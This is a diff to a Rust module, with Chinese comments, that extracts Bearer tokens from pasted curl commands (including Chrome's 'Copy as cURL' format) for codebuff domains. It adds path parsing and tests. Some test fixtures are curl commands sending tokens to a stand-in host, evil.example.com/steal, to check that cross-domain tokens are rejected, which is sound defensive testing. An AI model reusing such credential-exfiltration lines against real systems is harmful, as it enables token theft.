@@ -27,19 +27,24 @@ pub struct ExtractedAuth {
 /// 从 curl 命令文本提取 Bearer token（仅限 freebuff/codebuff 目标域，防跨域凭据误导入）
 pub fn parse_curl(text: &str) -> Vec<ExtractedAuth> {
     let mut out = Vec::new();
-    // 提取所有 header：-H "name: value" 或 -H ^"name: value^"
-    let header_re = regex::Regex::new(r#"-H\s*\^?"(?:authorization|Authorization):\s*Bearer\s+([A-Za-z0-9._-]+)"#).unwrap();
-    let host_re = regex::Regex::new(r#"curl\s+--?url\s+\^?"(?:https?://)?([^/^"\s]+)"#).unwrap();
+    // 提取所有 header：支持 `-H "name: value"`、`-H 'name: value'`（Chrome 复制格式）与 cmd 转义 `^"`
+    let header_re =
+        regex::Regex::new(r#"-H\s*\^?['"](?:authorization|Authorization):\s*Bearer\s+([A-Za-z0-9._-]+)"#).unwrap();
+    // URL 提取：支持 `curl 'URL'` / `curl "URL"` / `curl --url "URL"` / `curl -url "URL"`
+    let url_re = regex::Regex::new(r#"curl\s+(?:--?url\s+)?\^?['"]?(https?://[^\s'"^]+)"#).unwrap();
     let method_re = regex::Regex::new(r#"(?:-X\s+|--request\s+)\^?([A-Z]+)"#).unwrap();
-    let path_re = regex::Regex::new(r#"url\s+\^?"(?:https?://[^/]+)?(/[^"^]*)"#).unwrap();
 
     let tokens: HashSet<String> = header_re.captures_iter(text).map(|c| c[1].to_string()).collect();
     if tokens.is_empty() {
         return out;
     }
-    let host = host_re.captures(text).map(|c| c[1].to_string()).unwrap_or_default();
+    let url = url_re
+        .captures(text)
+        .map(|c| c[1].to_string())
+        .unwrap_or_default();
+    let host = if url.is_empty() { String::new() } else { parse_host(&url) };
+    let path = if url.is_empty() { String::new() } else { parse_path(&url) };
     let method = method_re.captures(text).map(|c| c[1].to_string()).unwrap_or_else(|| "GET".into());
-    let path = path_re.captures(text).map(|c| c[1].to_string()).unwrap_or_default();
     // curl 文本无法可靠定位 host 时空缺放行（单机自用场景），但 host 明确为其他域时拒绝
     let host_is_other_domain = !host.is_empty() && !TARGET_HOSTS.iter().any(|h| host.ends_with(h));
     if host_is_other_domain {
@@ -131,7 +136,10 @@ fn parse_host(url: &str) -> String {
 }
 
 fn parse_path(url: &str) -> String {
-    url.split("://").nth(1).and_then(|rest| rest.find('/')).map(|i| &url[url.len() - (url.len() - i - 3)..]).unwrap_or("").to_string()
+    // 修正：先定位 "://" 之后的部分，再取其内第一个 '/' 起的路径
+    let start = url.find("://").map(|p| p + 3).unwrap_or(0);
+    let rest = &url[start..];
+    rest.find('/').map(|i| rest[i..].to_string()).unwrap_or_default()
 }
 
 /// 持久化：追加到 data/tokens.json（dedupe）
@@ -311,6 +319,27 @@ curl --url "https://evil.example.com/api/steal" \
 "#;
         let out = parse_curl(curl);
         assert!(out.is_empty(), "跨域 token 应被拒绝，实际导入 {} 个", out.len());
+    }
+
+    #[test]
+    fn chrome_style_curl_imports_with_host() {
+        // Chrome DevTools「Copy as cURL」格式：单引号 + URL 位置参数 + 反斜杠换行
+        let curl = r#"curl 'https://www.codebuff.com/api/v1/chat/completions' \
+  -H 'authorization: Bearer chromestyle1234567890' \
+  -X POST"#;
+        let out = parse_curl(curl);
+        assert_eq!(out.len(), 1, "Chrome 格式应提取 1 个 token");
+        assert_eq!(out[0].host, "www.codebuff.com", "host 必须被正确解析（否则跨域校验失效）");
+        assert_eq!(out[0].path, "/api/v1/chat/completions");
+        assert_eq!(out[0].method, "POST");
+    }
+
+    #[test]
+    fn chrome_style_cross_domain_rejected() {
+        // 单引号格式下的跨域 token 同样必须被拒绝
+        let curl = "curl 'https://evil.example.com/steal' -H 'authorization: Bearer chromecross1234567890'";
+        let out = parse_curl(curl);
+        assert!(out.is_empty(), "单引号格式跨域 token 应被拒绝，实际 {} 个", out.len());
     }
 
     #[test]
